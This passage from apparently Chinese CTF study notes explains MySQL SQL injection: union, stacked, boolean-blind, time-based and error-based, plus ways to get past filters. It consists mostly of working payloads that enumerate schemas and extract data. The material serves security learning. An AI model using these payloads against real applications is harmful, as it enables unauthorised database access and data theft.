<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata # 查数据库名<br><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #查表名<br><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #查列名 <br></code></pre></td></tr></table></figure>

<h2 id="五、注入类型"><a href="#五、注入类型" class="headerlink" title="五、注入类型"></a>五、注入类型</h2><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p>
<ul>
<li><p>数字类型的注入</p>
</li>
<li><p>字符串类型的注入</p>
</li>
<li><p>搜索型注入</p>
</li>
</ul>
<p><strong>依据提交方式分类</strong></p>
<ul>
<li><p>GET注入</p>
</li>
<li><p>POST注入</p>
</li>
<li><p>COOKIE注入</p>
</li>
<li><p>HTTP头注入(XFF注入、UA注入、REFERER注入）</p>
</li>
</ul>
<p><strong>依据获取信息的方式分类</strong></p>
<ul>
<li><p>基于布尔的盲注</p>
</li>
<li><p>基于时间的盲注</p>
</li>
<li><p>基于报错的注入</p>
</li>
<li><p>联合查询注入</p>
</li>
<li><p>堆叠注入 (可同时执行多条语句)</p>
</li>
</ul>
<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>要求列数一致</p>
<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>整型的也差不多，去掉’</p>
<p>部分题目也可能在字符型基础上加括号等,若注释被屏蔽</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> …… <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure>
</blockquote>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>多条sql语句一起执行,利用加<code>;</code>的操作</p>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持，权限不足等</p>
<h3 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h3><p>可考虑使用RENAME关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> tables; #查看所有表<br><span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> `表名`; #看列<br>RENAME <span class="hljs-keyword">TABLE</span> `words` <span class="hljs-keyword">TO</span> `words1`; #改名为words1<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> `words` CHANGE `flag` `id` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>;#将新words表的列flag改为id<br></code></pre></td></tr></table></figure>

<h3 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h3><p>过滤select时，使用handler语句（mysql专用语句）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">handler users <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> hd; #指定数据表users进行载入并将返回句柄重命名为hd<br>handler hd read <span class="hljs-keyword">first</span>; #读取指定表<span class="hljs-operator">/</span>句柄的首行数据<br>handler hd read next; #读取指定表<span class="hljs-operator">/</span>句柄的下一行数据<br>handler hd <span class="hljs-keyword">close</span>; #关闭句柄<br></code></pre></td></tr></table></figure>

<p>预处理</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">prepare</span> xxx <span class="hljs-keyword">from</span> &quot;sql语句&quot;;<br><span class="hljs-keyword">execute</span> xxx;<br>#由于<span class="hljs-keyword">sql</span>语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤<br>#比如过滤了<span class="hljs-keyword">select</span><br><span class="hljs-keyword">PREPARE</span> st <span class="hljs-keyword">from</span> concat(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514`&#x27;</span>);<span class="hljs-keyword">EXECUTE</span> st;#<br></code></pre></td></tr></table></figure>

<p>例题：强网杯随便注</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><ul>
<li><p>mid(): <code>mid(s,n,len);</code> 从字符串 s 的 n 位置截取长度为 len 的子字符串</p>
</li>
<li><p>substr()&#x2F;substring(): <code>substr(s, start, length); substring(s, start, length)</code> 从字符串 s 的 start 位置截取长度为 length 的子字符串</p>
</li>
<li><p>left(): <code>left(s,n);</code> 返回字符串 s 的前 n 个字符</p>
</li>
<li><p>right(): <code>right(s,n);</code> 返回字符串 s 的后 n 个字符</p>
</li>
<li><p>ascii()&#x2F;ord() <code>ascii(s);/ord(s);</code> 返回字符串 s 的第一个字符的 ASCII 码。 这里不考虑多字节字符，比如汉字</p>
</li>
<li><p>trim()&#x2F;rtrim()&#x2F;ltrim() </p>
<ul>
<li><code>ltrim(s);</code> 去掉字符串s开始处的空格 </li>
<li><code>rtrim(s);</code> 去掉字符串s结尾处的空格 </li>
<li><code>trim(s);</code> 去掉字符串开始和结尾处的空格</li>
</ul>
<blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">TRIM</span>([<span class="hljs-keyword">BOTH</span><span class="hljs-operator">/</span><span class="hljs-keyword">LEADING</span><span class="hljs-operator">/</span><span class="hljs-keyword">TRAILING</span>] 目标字符串 <span class="hljs-keyword">FROM</span> 源字符串);<br><span class="hljs-keyword">BOTH</span>删除两边的指定字符串 <br><span class="hljs-keyword">LEADING</span>删除左边的指定字符串 <br>TARILING删除右边的指定字符串<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;) <span class="hljs-operator">=</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;);<br></code></pre></td></tr></table></figure>

<p>以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b 当这个结果返回0时(说明有一个成功匹配)，则第一个字符是a或者b。 </p>
<p>接着让a的ASCII+2变成c，如果返回1(bc都不匹配)，则字符串第一位为a，反之第一位为b。</p>
<p>这样做的目的是为了方便写脚本 第二个字符判断 select trim(LEADING “aa” from “abcd”) &#x3D; trim(LEADING “ab” from “abcd”); 接着重复上面的过程，判断第二个字符 以此推出整个字符串</p>
<p>如果&#x3D;用regexp替代那么正确的字符一定在regexp前面以这个abcd为例 Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’) 就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1 因此只需判断第一步即可，而不需要ASCII+2去判断了 </p>
<p>⚠️：如果用regexp，要先在<code>trim(LEADING &quot;a&quot; from &quot;abcd&quot;) != trim(LEADING &quot;b&quot; from &quot;abcd&quot;)</code>的条件下，因为两个相同字符串间的regexp也会返回1</p>
<p>注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;)); <span class="hljs-comment">-- cd </span><br></code></pre></td></tr></table></figure>

<p>先截断a，返回字符串bcd，在截断b，返回字符串cd</p>
</blockquote>
</li>
<li><p>Insert()</p>
<blockquote>
<p><code>INSERT(s1,x,len,s2)</code> 字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">例子：第一步删除起始的前x位<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;);<br><span class="hljs-comment">-- 输出：abcdef</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;);<br><span class="hljs-comment">-- 输出：bcdef</span><br>第二步套娃删除x<span class="hljs-operator">+</span><span class="hljs-number">1</span>位以后的所有<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- 输出：a</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- 输出：b</span><br></code></pre></td></tr></table></figure></blockquote>
</li>
</ul>
<h3 id="盲注常用方法"><a href="#盲注常用方法" class="headerlink" title="盲注常用方法"></a>盲注常用方法</h3><ul>
<li><p>if&#x2F;case 用在select查询当中，当做一种条件来进行判断</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(条件,为真结果,为假结果)<br># <span class="hljs-keyword">case</span>语法（两种）<br>简单函数 <br><span class="hljs-keyword">CASE</span> [col_name] <span class="hljs-keyword">WHEN</span> [value1] <span class="hljs-keyword">THEN</span> [result1]…<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br>搜索函数 <br><span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> [expr] <span class="hljs-keyword">THEN</span> [result1]…<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">2</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span>  <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">12</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">3</span><span class="hljs-operator">&lt;</span><span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">3</span> <span class="hljs-keyword">then</span> <span class="hljs-number">3</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>搜索函数优先匹配第一个为真的条件,也可以只写一个条件，代替if语句</p>
</blockquote>
</li>
<li><p>regexp&#x2F;rlike 正则表达式注入（可以代替if）</p>
<blockquote>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(if((<span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^r&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">user</span>() regexp<span class="hljs-string">&#x27;^ri&#x27;</span>); # i表示不区分大小写<br><br><span class="hljs-keyword">select</span> rpad(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="hljs-string">&#x27;(a.*)+&#x27;</span>,<span class="hljs-number">30</span>),<span class="hljs-string">&#x27;b&#x27;</span>);<br></code></pre></td></tr></table></figure>

 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name regexp <span class="hljs-string">&#x27;^us[a-z]&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>

<p> 这里只要更换regexp表达式即可</p>
<p> <img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231275.jpg" srcset="/img/loading.gif" lazyload alt="image-20220708162044974"></p>
<p> 注：regexp不区分大小写，需要大小写敏感要加上binary关键字</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-type">binary</span> database() regexp &quot;^CTF&quot;;<br></code></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>like匹配注入(适用于&#x3D;被过滤)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p>benchmark函数 测试操作性能</p>
</li>
<li><p>get_lock</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>第一个连接<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>打开另一个cmd  再次连接mysql，执行get_lock，发现延时<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">1.00</span> sec)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用mysql_pconnect(打开一个到 MySQL 服务器的持久连接)函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p>
</blockquote>
</li>
</ul>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))#<br># sleep延时<br><span class="hljs-keyword">select</span> sleep(find_in_set(mid(@<span class="hljs-variable">@version</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;</span>));# 在<span class="hljs-number">0</span><span class="hljs-number">-9.</span>中找版本号第一位<br></code></pre></td></tr></table></figure>

<blockquote>
<p>sleep函数延时不常用，时间可能因网速影响</p>
</blockquote>
<p>利用BENCHMARK()进行延时注入 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> (IF(<span class="hljs-built_in">SUBSTRING</span>(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>),BENCHMARK(<span class="hljs-number">50000000</span>,ENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)),<span class="hljs-keyword">null</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> database() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1<span class="hljs-comment">--+</span><br># 当结果正确的时候，运行ENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)操作<span class="hljs-number">50000000</span> 次，会占用一段时间。<br></code></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="报错盲注–floor报错"><a href="#报错盲注–floor报错" class="headerlink" title="报错盲注–floor报错"></a>报错盲注–floor报错</h3><p><u>适用于低版本，mysql8似乎被修复</u></p>
<p>floor报错注入是利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p>
<h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><ul>
<li>rand() 是一个随机函数(产生0到1间随机浮点数),直接使用每次产生的数都不同，但是当提供了一个固定的随机数的种子0之后：这样每次产生的值都是一样的。</li>
<li>floor(rand(0)*2） floor()是向下取整，这样可以得到只含0 1的伪随机序列</li>
</ul>
<h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当执行以下语句时会报错(主键冲突)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>) x <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>主要利用floor(rand(0)*2)的结果规律为0 1 1 0 1 1，当数据表中最少需要三条数据才会报错</p>
<p>floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</p>
</blockquote>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br>#也可以简化成<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>));<br>#关键表被过滤时<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">!</span><span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))<br>#rand被过滤 适用用户变量<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">min</span>(<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(password,<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(<span class="hljs-variable">@a</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">爆库<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x )a;<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.hackblog.cn<span class="hljs-operator">/</span>sql.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">distinct</span><br>concat(<span class="hljs-number">0x7e</span>,schema_name,<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">FROM</span> information_schema.schemata LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br>爆表<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span 